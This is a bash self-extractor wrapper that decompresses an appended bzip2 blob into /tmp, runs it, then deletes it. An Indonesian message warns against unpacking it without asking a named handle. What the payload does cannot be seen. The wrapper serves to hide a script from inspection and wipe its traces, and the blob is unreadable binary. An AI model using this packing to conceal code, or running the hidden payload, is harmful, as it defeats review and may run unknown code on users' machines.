#!/bin/bash
skip=23
set -C
umask=`umask`
umask 77
tmpfile=`tempfile -p gztmp -d /tmp` || exit 1
if /usr/bin/tail -n +$skip "$0" | /bin/bzip2 -cd >> $tmpfile; then
  umask $umask
  /bin/chmod 700 $tmpfile
  prog="`echo $0 | /bin/sed 's|^.*/||'`"
  if /bin/ln -T $tmpfile "/tmp/$prog" 2>/dev/null; then
    trap '/bin/rm -f $tmpfile "/tmp/$prog"; exit $res' 0
    (/bin/sleep 5; /bin/rm -f $tmpfile "/tmp/$prog") 2>/dev/null &
    /tmp/"$prog" ${1+"$@"}; res=$?
  else
    trap '/bin/rm -f $tmpfile; exit $res' 0
    (/bin/sleep 5; /bin/rm -f $tmpfile) 2>/dev/null &
    $tmpfile ${1+"$@"}; res=$?
  fi
else
  echo MAU DIBONGKAR YA BANG ? IZIN DULU KE @tau_samawa $0; exit 1
fi; exit $res
BZh91AY&SY*V �  �߀ 0}��%�����P��ݔSZ6SH(�y����M=Ca�h4"d�OF�'����h�@�jdɩ�OS'�  h 4��` &	�  &��a)��L�順�@  h��8yE���1�����=��9:q�(���|�O��Ujx`항��f�Ք}�Zp�;�M���l�e
؝r���2�a/(P���$f��K�I��|����Լn�N��2���Y��[�9��N��HfG����tT�t�Ж�h�kh�;��'��y��Ʈ�~A�T�=��>`��hB ���b�!�������8�C�2�iͽC:��:	�Ou���)�ٵ�T��x�d����ٴ"�'�r�(�{P�&��G�D��'�6"��g�w&��(�hg5V�&��v�4�S/S�G�SŊs2���/u�*0��;�q�G��*��XcYAʔE�D�²FJ�du��jO�ɽ���B�Ԑy���4VU�.�O=
��uowM������h�X���6�ܕ�@��%���"�䠧՜�
!�i�yNb�Jn��h��tOK�/^�i���K�/AE�L��q�5L'�Wl�������0�*j���MyƋ���i,1�x�\m�һ0����$�^aJt$.oDb
�pc�i�s3�a�ΈH=S�'h}�Y/�>z�7o��F�N��d����<"��!�
�TQ���dU�V!�w:'-1s�1�
���u��e�;B��k"��b��B"s7�*O�RO��M8l3�s���c���
/W �G��	�b�t]�.ֽ���)+�� H��ҕ#�Ka�W~�i��a�Rn�0U���9r4�8U�J��0�A�df�4���JF�6��P�mr�,
�������LQ�M�Q��#�0��lb��\Q���l�P�l��:��ǩ����z���(���汈�i�M�ԁ5a=8,l3�Pf`!q��Ⱥ��*>�s�]yL�K�d`���)�R�X